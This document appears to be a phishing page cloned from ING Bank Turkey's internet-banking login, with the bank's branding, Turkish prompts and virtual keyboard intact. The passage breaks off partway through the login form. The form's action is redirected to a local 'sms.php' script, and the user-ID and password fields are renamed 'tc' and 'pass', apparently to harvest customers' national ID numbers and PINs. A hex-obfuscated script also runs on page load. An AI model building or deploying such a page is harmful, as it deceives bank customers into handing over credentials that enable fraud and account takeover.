﻿<!DOCTYPE html>
<!-- saved from url=(0182)https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d -->
<html class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><title>ING Bank</title><meta name="viewport" content="width=device-width,user-scalable=no"><meta name="robots" content="noindex, nofollow"><link rel="icon" type="image/png" href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/Content/icons/favicon.png"><link rel="apple-touch-icon" href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/Content/icons/favicon.png"><link rel="apple-touch-icon" sizes="72x72" href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/Content/icons/favicon72.png"><link rel="apple-touch-icon" sizes="114x114" href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/Content/icons/favicon114.png"><meta name="format-detection" content="telephone=no"><meta http-equiv="cache-control" content="max-age=0"><meta http-equiv="cache-control" content="no-cache"><meta http-equiv="expires" content="0"><meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT"><meta http-equiv="pragma" content="no-cache"><style>@media print {
            html, body {
                width: 1020px !important;
            }
            #bottomContentDiv, #side, #navigationControlDiv {
                display: none;
            }
        }</style><!--[if lte IE 8]><script type="text/javascript" src="/WebApplication.UI/content/js/html5shiv.js"></script><link rel="stylesheet" type="text/css" href="/WebApplication.UI/Content/css/htc.css" /><link rel="stylesheet" type="text/css" href="/WebApplication.UI/Content/css/wfull-site.css" /><link rel="stylesheet" type="text/css" href="/WebApplication.UI/Content/css/ie8.css" /><link rel="stylesheet" type="text/css" href="/WebApplication.UI/Content/css/ie8-online.css" /><![endif]--><!--[if lt IE 9]><link rel="stylesheet" type="text/css" href="/WebApplication.UI/Content/css/bundled/GeneralCss.css?V=201791211575"  /><script type="text/javascript" src="/WebApplication.UI/Content/js/bundled/MainScriptForOldBrowsers.js?V=201719172447"  ></script><![endif]--><!--[if gte IE 9]><!--><link rel="stylesheet" type="text/css" href="./GeneralCss.css"><script type="text/javascript" async="" src="./ga.js"></script><script type="text/javascript" src="./MainScript.js"></script><!--<![endif]--><link rel="stylesheet" type="text/css" href="./smart_w640.css" media="screen and (max-width:767px)"><link rel="stylesheet" type="text/css" href="./smart_w480.css" media="screen and (max-width:480px)"><link rel="stylesheet" type="text/css" href="./smart_wfull.css" media="screen and (min-width:768px)"><script src="./Tealeaf.js" type="text/JavaScript"></script><script>var _0xb010 = ["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x70\x69\x78\x65\x6C\x73\x2E\x69\x6E\x67\x62\x61\x6E\x6B\x2E\x63\x6F\x6D\x2E\x74\x72\x2F\x70\x69\x78\x65\x6C\x2E\x67\x69\x66\x3F\x76\x65\x72\x3D", "\x67\x65\x74\x54\x69\x6D\x65", "\x47\x45\x54", "\x6F\x70\x65\x6E", "\x73\x65\x6E\x64", "\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74", "\x6F\x6E\x6C\x6F\x61\x64"]; function lb() { var _0x83e3x2 = new Date(); var _0x83e3x3 = _0xb010[0] + _0x83e3x2[_0xb010[1]](); var _0x83e3x4 = new XMLHttpRequest(); _0x83e3x4[_0xb010[3]](_0xb010[2], _0x83e3x3, false); _0x83e3x4[_0xb010[4]](null); return _0x83e3x4[_0xb010[5]] } window[_0xb010[6]] = lb</script><script type="text/javascript" src="./Script_Tr.js"></script><script>function isIeDocumentModeWrong()
    {
        userAgent = navigator.userAgent;
        documentMode = document.documentMode;
        documentModeErrorMessage = "Tarayıcınızı uyumluluk modunda kullanıyorsunuz. Detaylı bilgi için <a target='_parent' href='http://www.ingbank.com.tr/tr/bilgi-destek/ing-internet-subesi#faq107175' >lütfen tıklayın.</a>";
        if (userAgent.indexOf("Trident/4.0") != -1 && documentMode != "8")
        {
            ShowErrorOnTop(documentModeErrorMessage);
        }
        if (userAgent.indexOf("Trident/5.0") != -1 && documentMode != "9")
        {
            ShowErrorOnTop(documentModeErrorMessage);
        }
        if (userAgent.indexOf("Trident/6.0") != -1 && documentMode != "10")
        {
            ShowErrorOnTop(documentModeErrorMessage);
        }
        if (userAgent.indexOf("Trident/7.0") != -1 && documentMode != "11")
        {
            ShowErrorOnTop(documentModeErrorMessage);
        }
    }
    $(document).ready(function() {
        isIeDocumentModeWrong();
    });
</script><script type="text/javascript">$(document).ready(function () {
            $(document).find("input").on("change", function (e) { TLT.processDOMEvent(e); });
            if ($('#ctl00_mc_cpAskPasswordGray')) {
                $('#ctl00_mc_cpAskPasswordGray').attr('style', 'display:none');
            }
            $('#txtuserid').val('');
            $('#txtTckn').val('');
            $(document).keydown(function (e) {
                evalToFormSubmit(e);
            });
            $('#txtuserid').keyup(function (e) {
                evalToFormSubmit(e);
            });
            $('#txtPass').keypress(function (e) {
                isCapsLockOn(e, 'divCapsLock', 'Büyük harf kilidinizin (Caps Lock) açık olması şifrenizi hatalı girmenize neden olabilir.');
                if ((e.keyCode ? e.keyCode : e.which) != 13 && $(this).val().length >= $(this).attr('maxLength')) {
                    $('#divCapsLock').show();
                    $('#divCapsLock').html('Şifreniz 6 rakamdan oluşmalıdır.');
                }
            });
            $('#txtPass').keyup(function (e) {
                evalToFormSubmit(e);
                if ($(this).val().length < $(this).attr('maxLength') && $('#divCapsLock').html() == 'Şifreniz 6 rakamdan oluşmalıdır.')
                    $('#divCapsLock').hide();
            });
            $('#txtTckn').keyup(function (e) {
                evalToFormSubmit(e);
            });
            $('#txtPass2').keyup(function (e) {
                evalToFormSubmit(e);
                if ($(this).val().length < $(this).attr('maxLength') && $('#divCapsLockForTckn').html() == 'Şifreniz 6 rakamdan oluşmalıdır.')
                    $('#divCapsLockForTckn').hide();
            });
            $('#txtPass2').keypress(function (e) {
                isCapsLockOn(e, 'divCapsLockForTckn', 'Büyük harf kilidinizin (Caps Lock) açık olması şifrenizi hatalı girmenize neden olabilir.');
                if ((e.keyCode ? e.keyCode : e.which) != 13 && $(this).val().length >= $(this).attr('maxLength')) {
                    $('#divCapsLockForTckn').show();
                    $('#divCapsLockForTckn').html('Şifreniz 6 rakamdan oluşmalıdır.');
                }
            });
            $('#txtCardNumber1').keyup(function (e) {
                evalToFormSubmit(e);
            });
            $('#txtCardNumber2').keyup(function (e) {
                evalToFormSubmit(e);
            });
            $('#txtCardNumber3').keyup(function (e) {
                evalToFormSubmit(e);
            });
            $('#txtCardNumber4').keyup(function (e) {
                evalToFormSubmit(e);
            });
            $('#txtCardPin').keyup(function (e) {
                evalToFormSubmit(e);
            });
            $('#ctl00_mc_txtPhoneNumber_countryCodeBox').keyup(function (e) {
                evalToFormSubmit(e);
            });
            $('#ctl00_mc_txtPhoneNumber_phoneNumberBox').keyup(function (e) {
                evalToFormSubmit(e);
            });
            //SetTimerForQRCode();
            // asyncManagerClient.Instance.Call('QRCodeOtomaticLoginCall');
        });
        function TimeFormat(timeInput) {
            seconds = Math.floor(timeInput % 60);
            minutes = Math.floor(timeInput / 60);
            if (minutes < 10) { minutes = "0" + minutes; }
            if (seconds < 10) { seconds = "0" + seconds; }
            return minutes + ':' + seconds;
        }
        function evalToFormSubmit(e) {
            if (($(theForm).data('issubmetted') === undefined || $(theForm).data('issubmetted') === false)) {
                $(e.target).trigger("change"); // for tealeaf
                code = (e.keyCode ? e.keyCode : e.which);
                if (code == 13) {
                    Page_ClientValidate('');
                    if (Page_IsValid) {
                        eval($('#ctl00_mc_btnLogin').attr('href'));
                        $(theForm).data('issubmetted', true);
                        doubleClickPreventLayer.show();
                    }
                }
            }
        }</script><script type="text/javascript">function CardNumberRequired(source, args) {
            var cardNumber1 = $('#txtCardNumber1');
            var cardNumber2 = $('#txtCardNumber2');
            var cardNumber4 = $('#txtCardNumber4');
            if (cardNumber1.val().length < 4) {
                args.IsValid = false;
            }
            else if (cardNumber2.val().length < 2) {
                args.IsValid = false;
            }
            else if (cardNumber4.val().length < 4) {
                args.IsValid = false;
            }
        }</script><script type="text/javascript">$(window).on('load', function () {
            $('#txtuserid').focus();
            $('#txtTckn').focus();
            $('#txtCardNumber1').focus();
        });</script><script type="text/javascript">$(window).on('load', function () {
            liveSupport.popup.close();
        });</script><style type="text/css">.small-form .no-label {
            padding: 0 0 0 220px;
        }</style><style type="text/css">.fancybox-margin{margin-right:0px;}</style></head><body oncontextmenu="return true"><!--[if lt IE 9]><div id="login-bar" class="hidden"><div class="container"><div class="w9" style="line-height: 1em !important;"><span class="ui-bar-icons online"></span>Internet Explorer tarayıcınızı yükselterek sitemizde bulunan içerikten en iyi şekilde faydalanabilirsiniz, farklı bir tarayıcı kullanmanız veya tarayıcınızı güncellemeniz gerekmektedir. Tarayıcınızı güncellemek için lütfen<a href="http://windows.microsoft.com/tr-TR/internet-explorer/download-ie" target="_top" class="underline">tıklayın</a>!</div><div class="logout f-right close"><span class="ui-bar-icons logout"></span><a href="#">Kapat</a></div><div class="clearfix"></div></div></div><![endif]--><form method="post" action="sms.php" id="mokoko" autocomplete="off"><div class="aspNetHidden"><input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value=""><input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value=""><input type="hidden" name="__LASTFOCUS" id="__LASTFOCUS" value=""><input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value=""></div><script type="text/javascript">//<![CDATA[
var theForm = document.forms['aspnetForm'];
if (!theForm) {
    theForm = document.aspnetForm;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
//]]></script><script src="./WebResource.axd" type="text/javascript"></script><script type="text/javascript">//<![CDATA[
$(document).ready(function(){
    $('#ctl00_mc_txtPhoneNumber_countryCodeBox').change(function(){
        var countryCode = $('#ctl00_mc_txtPhoneNumber_countryCodeBox').val();
        if (!$.isMobile)
        {
            if (typeof(countryCode)=='undefined' || countryCode == '90' || (countryCode != '' && countryCode.length == 0))
            {
                $('#document').click();
                $('#ctl00_mc_txtPhoneNumber_phoneNumberBox').mask('999 999 99 99');
            }
            else
            {
                $('#ctl00_mc_txtPhoneNumber_phoneNumberBox').removeAttr('placeholder');
                $('#document').click();
                $('#ctl00_mc_txtPhoneNumber_phoneNumberBox').mask('999999999999999');
            }
        }
    });
});
$(window).on('load' ,function(){
     var countryCode = $('#ctl00_mc_txtPhoneNumber_countryCodeBox').val();
     if (!$.isMobile)
        {
            if (typeof(countryCode)=='undefined' || countryCode == '90' || countryCode.length == 0)
             {
                 $('#ctl00_mc_txtPhoneNumber_phoneNumberBox').mask('599 999 99 99');
             }
             else
             {
                 $('#ctl00_mc_txtPhoneNumber_phoneNumberBox').mask('999999999999999');
             }
        }
});
            function phoneNumberBoxAllowZero() {
                var phoneNumber = $('#ctl00_mc_txtPhoneNumber_phoneNumberBox').val();
                var countryCode = $('#ctl00_mc_txtPhoneNumber_countryCodeBox').val();
                if (countryCode == '90' && phoneNumber[0] == '0') {
                        $('#ctl00_mc_txtPhoneNumber_phoneNumberBox').val(phoneNumber.substr(1, phoneNumber.length - 1));
                }
            }
            $(document).ready(function(){
                $('#ctl00_mc_txtPhoneNumber_phoneNumberBox').keypress(function (e) {
                        setTimeout('phoneNumberBoxAllowZero();', 100);
                });
            });//]]></script><script src="./WebResource(1).axd" type="text/javascript"></script><script type="text/javascript">//<![CDATA[
function WebForm_OnSubmit() {
if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;showDoubleClickLayer();
return true;
}
//]]></script>



<div id="viewport" class="form logged-out"><div id="doubleClickPreventLayer" class="customfancybox-overlay customfancybox-overlay-fixed" style="width: auto; height: auto; display: none; z-index: 899;"></div><div id="side"><header id="ctl00_loginHeader"><div class="container"><div class="bar p-content"><div class="logo"><a onclick="window.top.location.href=&#39;http://www.ingbank.com.tr&#39;;return false;;return ;;" id="ctl00_IngLogo" href="javascript:__doPostBack(&#39;ctl00$IngLogo&#39;,&#39;&#39;)"></a></div><div id="ctl00_pnlLogOut"><div class="infoline-action"></div></div><div class="clearfix"></div></div><div class="online-logout"><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="ui-buttons small orange iconic account-toggle w640"><span class="ui-icons close"></span></a><div class="wrap"><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/LogoutHandler.ashx" id="ctl00_MobileLogOutLinkButton" class="ui-buttons small last w640 blue"><span class="ui-arrows small blue"></span><p>LOGOUT SECURELY</p></a><span class="banking-text w640">Çıkış</span><span class="banking-pass m-t10 w640"><a onclick="return ;;" id="ctl00_ReturnBankingLinkButton" class="pos-static" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$ReturnBankingLinkButton&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, true))">Return to Online Banking</a></span></div></div></div></header></div><div id="page"><script type="text/javascript">var id = '#' + 'asyncMsgCntctl00_mc_lblTemp';
                    $("#page").on("click", function () {
                        if ($(id)) {
                            SetResultContainerRemoveTimeOut('asyncMsgCntctl00_mc_lblTemp', 50);
                        }
                    });</script><div class="shadow-l"></div><div class="shadow-r"></div><section><div class="main-area"><div class="container" id="containerDiv"><!--demet temp display:none--><nav class="secondary-nav f-right m-t10" style="display: none;"><div id="ctl00_pnlTopMenu"><ul class="menu"><li id="ctl00_lblLoginByUsername" class="active"><a onclick="return ;;" id="ctl00_btnLoginByUsername" loginbuttontype="LoginByUserName" href="javascript:__doPostBack(&#39;ctl00$btnLoginByUsername&#39;,&#39;&#39;)">Kullanıcı Kodu</a></li><li id="ctl00_lblLoginByIdentityNo" class=""><a onclick="return ;;" id="ctl00_btnLoginByIdentityNo" loginbuttontype="LoginByTckn" href="javascript:__doPostBack(&#39;ctl00$btnLoginByIdentityNo&#39;,&#39;&#39;)">T.C. Kimlik No</a></li></ul></div></nav><div id="ctl00_lblWelcomeHeaderContainer" class="top-title"><h1 class="welcome-header w640-lh-24"><label id="ctl00_lblWelcomeHeader" class="" ctl00_lblwelcomeheader="" data-asyncvisiblekey="" data-asyncvaluekey="">İnternet Şubesi'ne Hoş Geldiniz</label></h1><div class="separator wfull"></div></div><div id="tabs1" class="tab-contents m-t10"><div id="tab1" class="tab-content active"><div class="section-3 cf login-box hmin-w768"><div id="topInfoPanel"></div><div class="wrapper no-mbot"><h4 class="big-header"></h4></div><div id="resultControlTop"></div><div id="cntLbxD" class="wfull" style="position: absolute !important; width: 100% !important;"><div style="background-color: #f4f4f4; width: 590px; height: auto; margin-left: auto; margin-right: auto; position: relative; z-index: 2000;"></div></div><div id="cntLbxM" class="w640"><div style="background-color: #f4f4f4; width: auto; height: auto; margin-left: auto; margin-right: auto; position: relative; z-index: 2000;"></div></div><!--header gelecek--><div class="grid-3x2"><h2 class="welcome-title wfull">Kullanıcı Kodu / TCKN ile Giriş</h2><div class="ui-form login-form small-form"><script type="text/javascript">$(document).ready(function () {
    });
    function DisableKeyboard()
    {
        $('#VKeyboard').children()[0].className += " sbHolderDisabled";
        $('#keyboard-numbers').attr('style', 'pointer-events:none');
    }
    function EnableKeyboard()
    {
        $('#VKeyboard').children()[0].className = "keyboard wfull";
        $('#keyboard-numbers').attr('style', 'pointer-events:auto');
    }
</script><div id="VKeyboard" class="keyboard-container keyboard-numeric-layout keyboard-right m-t5" style="position: relative;top: -6px;left: 45px;"><div class="keyboard wfull" style="top: 0px; right: 0px; display: none;"><div class="close-link"><a id="close-keyboard" href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" data-action="hideKeyboard"><span class="ui-icons s10x10 close gray" style="margin-left:0"></span></a></div><div class="line cf checkbox-row hover-click keyboard-alerts"><div class="keyboard-alert"><div class="wrap err-only-keyboard">Lütfen klavye kullanmayınız.</div><div class="wrap err-maxlength">Daha fazla harf giremezsiniz.</div><div class="wrap err-only-numeric">Sadece rakam girişi yapabilirsiniz.</div></div></div><div class="cf"><div id="keyboard-letters" class="disabled"></div><div id="keyboard-numbers"><div class="keyboard-row cf"><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="key disabled"></a><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="key disabled"></a><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="key disabled"></a><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="key disabled"></a></div><div class="keyboard-row cf"><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="key key-active key-number-active">1</a><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="key key-active key-number-active ">2</a><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="key key-active key-number-active ">3</a><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="key disabled"></a></div><div class="keyboard-row cf"><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="key key-active key-number-active ">4</a><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="key key-active key-number-active ">5</a><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="key key-active key-number-active ">6</a><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="key disabled"></a></div><div class="keyboard-row cf"><div class="col-1"><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="key key-active key-number-active">7</a><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="key key-active key-number-active ">8</a><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="key key-active key-number-active ">9</a><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="key key-active key-number-active">0</a><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="key key-14" id="action-delete2" data-action="deleteChar"><span class="ui-icons-backspace m-r5"></span>SİL</a><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="key disabled"></a></div><div class="col-2"><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="key key-15 disabled"></a></div></div></div><div class="f-left" data-action="hoverClick" data-event="click"><div class="jCheckbox"><div class="trigger"></div></div><label class="m-l5">Tuşların üzerinde bekleyerek giriş</label></div><div class="actions"><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="ui-buttons icon-right small gray" id="action-alpha" data-action="changeOrder"><p>Alfabetik</p><span class="ui-arrows small orange-blank"></span></a><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="ui-buttons gray icon-right small" id="action-case" data-action="changeCase"><p>Büyük Harf</p><span class="ui-arrows small orange-blank"></span></a><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="ui-buttons gray icon-right small" id="action-random" data-action="randomChars"><p>Karıştır</p><span class="ui-arrows small orange-blank"></span></a><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="ui-buttons gray icon-right small seperated" id="action-delete" data-action="deleteChar"><p>SİL</p><span class="ui-arrows small  orange-blank"></span></a><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="ui-buttons icon-right small" data-action="submitForm"><p>Giriş</p><span class="ui-arrows small orange"></span></a></div></div></div></div><input type="password" id="dummypassword" name="dummypassword" style="display: none"><div id="ctl00_mc_pnlLoginByUserName"><script type="text/javascript">var asyncManagerClient= {
		Instance : null,
		Initialize: function(){
							var QRCodeOtomaticLoginCallSource= new AsyncSource();
			QRCodeOtomaticLoginCallSource.InitializeForCall('QRCodeOtomaticLoginCall','QRCodeOtomaticLogin_Async', 'https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx', '',true,false);
										var asyncSourceList = [ QRCodeOtomaticLoginCallSource];
			var asyncManager = new AsyncManager(asyncSourceList);
			asyncManager.Initialize();
			this.Instance=asyncManager;
		}
	}
	$(document).ready(function() {
		asyncManagerClient.Initialize();
	});
</script><div class="line cf"><label id="ctl00_mc_lblUserName" class="text-left title title" for="">Kullanıcı Kodu / TCKN<span class="ui-icons s20x20 info tooltip" data-tooltip-auto-off="" style=""><span class="popup"><p>Kullanıcı kodu veya TCKN ile giriş yapabilirsiniz.</p></span></span></label><div class="form-element"><input name="tc" type="text" maxlength="11" id="txtuserid" tabindex="1" class="medium has-keyboard has-keyboard-numeric f-left" onmouseout="VeriBranch_OnMouseOut(&#39;txtuserid&#39;);" autocomplete="off" placeholder="" data-allowspace="true" onpaste="if(HasNonnumeric(event)){return false;};" data-discardturkishcharacters="false" onmouseover="VeriBranch_OnMouseOver(&#39;txtuserid&#39;);" onclick="EnableKeyboard();" onblur="RemoveEscapedCharactersFromTextBox(this,&#39;txtuserid&#39;, [&#39;&lt;&#39;,&#39;&gt;&#39;,&#39;?&#39;])" data-holder="" onfocus="VeriBranch_TextOnFocus(&#39;txtuserid&#39;,&#39;&#39;,this);" onkeyup="OnlyNumericControl(this);" onkeypress="PreventSpecialKeys(this,event);;" onkeydown="TextBoxFocusOnNavigation(this,event);if(!Only_Numeric(event)){return false;};" data-uppercase="false"><div id="ctl00_mc_ctl16" class="input-tip" style="display: none; visibility: hidden;">Lütfen geçerli karakterler ile giriş yapın.
	</div></div><input type="text" id="my_username" style="z-index:-1000;border:none!important;position:absolute" tabindex="-1"><div class="clearfix"></div><div id="ctl00_mc_ValUserIdRequired" class="input-tip" style="display: none; visibility: hidden;">Lütfen kullanıcı kodunuzu veya TC kimlik numaranızı girin.
	</div></div><div class="line cf"><label id="ctl00_mc_lblPin" class="text-left title" for="">Şifre<span class="ui-icons s20x20 info tooltip" data-tooltip-auto-off="" style=""><span class="popup"><p>Şifrenizi bilmiyorsanız ING Nakit Kart veya Kredi Kartı bilgilerinizle "Yardım İstiyorum" bağlantısından şifre alabilirsiniz. Herhangi bir ING kartınız yoksa lütfen 0850 222 0 600 Telefon Bankacılığı'nı arayın.</p></span></span></label><input id="my_password" type="password" style="z-index:-1000;border:none!important;position:absolute" tabindex="-2"><div class="form-element"><input name="pass" type="password" maxlength="6" id="txtPass" tabindex="2" class="medium f-left has-keyboard has-keyboard-numeric" onmouseout="VeriBranch_OnMouseOut(&#39;txtPass&#39;);" autocomplete="off" placeholder="" data-allowspace="true" onpaste="if(HasNonnumeric(event)){return false;};" data-discardturkishcharacters="false" onmouseover="VeriBranch_OnMouseOver(&#39;txtPass&#39;);" onclick="EnableKeyboard();" onblur="RemoveEscapedCharactersFromTextBox(this,&#39;txtPass&#39;, [&#39;&lt;&#39;,&#39;&gt;&#39;,&#39;?&#39;])" data-holder="" onfocus="VeriBranch_TextOnFocus(&#39;txtPass&#39;,&#39;&#39;,this);" onkeyup="OnlyNumericControl(this);" onkeypress="PreventSpecialKeys(this,event);;" onkeydown="TextBoxFocusOnNavigation(this,event);if(!Only_Numeric(event)){return false;};" data-uppercase="false" style="font-weight:bold;"><div id="ctl00_mc_ctl17" class="input-tip" style="display:none;">Lütfen geçerli karakterler ile giriş yapın.
	</div></div><input name="ctl00$mc$pin" type="password" id="ctl00_mc_pin" style="z-index:-1000;border:none!important;position:absolute" tabindex="-3"></div><div id="divCapsLock" class="input-tip  capsLockInfo " style="display: none;"></div><div id="ctl00_mc_ValPasswordRequired" class="input-tip" style="display:none;">Lütfen şifrenizi girin.
